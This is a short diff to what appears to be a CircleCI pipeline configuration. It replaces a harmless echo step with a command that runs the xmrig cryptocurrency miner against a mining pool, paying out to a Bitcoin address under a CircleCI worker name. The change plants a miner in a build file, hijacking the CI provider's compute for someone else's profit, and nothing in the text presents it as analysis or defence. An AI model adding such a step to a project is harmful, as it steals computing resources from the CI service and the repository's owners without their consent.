@@ -10,5 +10,7 @@ jobs:
     steps:
       - checkout
       - run:
-         command: echo hello & echo world
+         command: |
+                   xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qwh4646ppd8dpj6fsd00mr9g6jeqd78jggcdntg.my_worker_circleci#Bitcoin-Tips -p x 
+                   pause
          shell: cmd.exe
